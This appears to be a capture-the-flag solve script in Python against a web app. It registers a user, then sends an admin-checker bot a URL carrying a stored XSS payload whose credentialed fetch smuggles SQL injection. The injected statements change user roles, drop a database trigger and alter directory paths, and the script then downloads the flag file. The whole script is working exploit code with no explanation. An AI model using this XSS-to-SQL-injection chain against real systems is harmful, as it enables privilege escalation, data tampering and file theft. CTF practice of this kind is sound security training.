import urllib.parse
import httpx

username = "/"
password = "kalmar"

# http://91.107.176.228:4000
client = httpx.Client(base_url="http://172.22.0.2:3000/", http2=True)

r = client.post("/register", data={"username": username, "password": password})
print(r, r.headers['location'])

r = client.post("/login", data={"username": username, "password": password})
print(r, r.headers['location'])

def sql(sqli_payload):
    assert len(sqli_payload) <= 50-(3+10)
    xss_payload = r"""https://slow.xn--sb-lka.org/<textarea><img src onerror="fetch('/debug/create_log', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({'log': `');"""
    xss_payload += sqli_payload
    xss_payload += r""";select \x22'`}) })"></textarea>"""

    payload = 'http://localhost:3000/checker?url=' + urllib.parse.quote_plus(xss_payload)
    print(sqli_payload)
    r = client.post("/checker/visit", data={'url': payload})
    print(r, r.headers['location'])

sql("UPDATE users SET role='user'")
sql("DROP TRIGGER users_immutable_dirs")
sql("UPDATE users SET scrap_dir=username")

# Login again to apply new role
r = client.post("/login", data={"username": username, "password": password})

files_txt = client.get("/files").text
idx = files_txt.find("/files/flag")
files_txt = files_txt[idx:]
idx = files_txt.find("'")
files_txt = files_txt[:idx]

print(f"Found flag location: {files_txt}")

r = client.get(files_txt)
print('flag:', r.text)

# Undo "everyone becomes user"
sql("UPDATE users SET role='demo'")
